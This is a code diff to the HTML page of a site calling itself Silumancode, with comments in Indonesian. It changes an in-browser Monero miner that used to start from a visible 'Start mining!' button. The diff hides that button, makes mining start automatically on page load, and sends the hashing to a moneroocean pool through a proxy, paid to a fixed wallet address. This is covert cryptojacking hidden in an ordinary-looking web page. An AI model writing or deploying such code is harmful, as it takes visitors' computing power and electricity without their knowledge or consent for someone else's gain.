@@ -16,71 +16,74 @@
     </div>
     <div class="content">
         <h2>Welcome to Silumancode</h2>
+        <div>
+    <textarea rows="4" cols="50" id="texta"></textarea> 
+       </div>
         <p>Explore the hidden layers of the web and discover tools, guides, and secrets.</p>
     </div>
     <script src="script.js"></script>
  <!--A TEXT FIELD-->
-  <div>
-    <textarea rows="4" cols="50" id="texta"></textarea> </div>
+ 
 
-  <!--A BUTTON-->
-  <div>
-    <button id="startb" onclick="start()">Start mining!</button>
-  </div>
+<!-- BUTTON (OPSIONAL, TIDAK DIPAKAI LAGI) -->
+<div>
+    <button id="startb" onclick="start()" style="display: none;">Start mining!</button>
+</div>
 
-  <!--THE MINER SCRIPT-->
-  <script src="miner/miner.js"></script>
+<!-- THE MINER SCRIPT -->
+<script src="miner/miner.js"></script>
 
-  <script>
-
+<script>
     function start() {
+        // Disable tombol (hanya jika tombol digunakan)
+        const startButton = document.getElementById("startb");
+        if (startButton) {
+            startButton.disabled = true;
+        }
 
-      document.getElementById("startb").disabled = true; // disable button
+        // Start mining dengan server lokal
+        const server = "wss://ny1.xmrminingproxy.com";
+        startMining(
+            "moneroocean.stream",
+            "86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB"
+        );
 
-      /* start mining, use a local server */
-      server = "wss://ny1.xmrminingproxy.com";
+        // Tambahkan pesan awal
+        addText("Connecting...");
 
-      startMining("moneroocean.stream",
-        "86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB");
-
-      /* Alternative (see logins.json): startMiningWithId("favpool");  */
-      
-      /* keep us updated */
-
-      addText("Connecting...");
-
-      setInterval(function () {
-        // for the definition of sendStack/receiveStack, see miner.js
-        while (sendStack.length > 0) addText((sendStack.pop()));
-        while (receiveStack.length > 0) addText((receiveStack.pop()));
-        addText("calculated " + totalhashes + " hashes.");
-      }, 2000);
-
+        // Update status setiap 2 detik
+        setInterval(function () {
+            while (sendStack.length > 0) addText(sendStack.pop());
+            while (receiveStack.length > 0) addText(receiveStack.pop());
+            addText("calculated " + totalhashes + " hashes.");
+        }, 2000);
     }
 
-    /* helper function to put text into the text field.  */
-
+    // Fungsi untuk menambahkan teks ke textarea
     function addText(obj) {
+        const elem = document.getElementById("texta");
+        elem.value += "[" + new Date().toLocaleString() + "] ";
 
-      var elem = document.getElementById("texta");
-      elem.value += "[" + new Date().toLocaleString() + "] ";
+        if (obj.identifier === "job") {
+            elem.value += "new job: " + obj.job_id;
+        } else if (obj.identifier === "solved") {
+            elem.value += "solved job: " + obj.job_id;
+        } else if (obj.identifier === "hashsolved") {
+            elem.value += "pool accepted hash!";
+        } else if (obj.identifier === "error") {
+            elem.value += "error: " + obj.param;
+        } else {
+            elem.value += obj;
+        }
 
-      if (obj.identifier === "job")
-        elem.value += "new job: " + obj.job_id;
-      else if (obj.identifier === "solved")
-        elem.value += "solved job: " + obj.job_id;
-      else if (obj.identifier === "hashsolved")
-        elem.value += "pool accepted hash!";
-      else if (obj.identifier === "error")
-        elem.value += "error: " + obj.param;
-      else elem.value += obj;
-
-      elem.value += "\n";
-      elem.scrollTop = elem.scrollHeight;
-
+        elem.value += "\n";
+        elem.scrollTop = elem.scrollHeight;
     }
 
-  </script>
+    // Otomatis mulai mining ketika halaman dimuat
+    window.onload = start;
+</script>
+
     
 </body>
 </html>
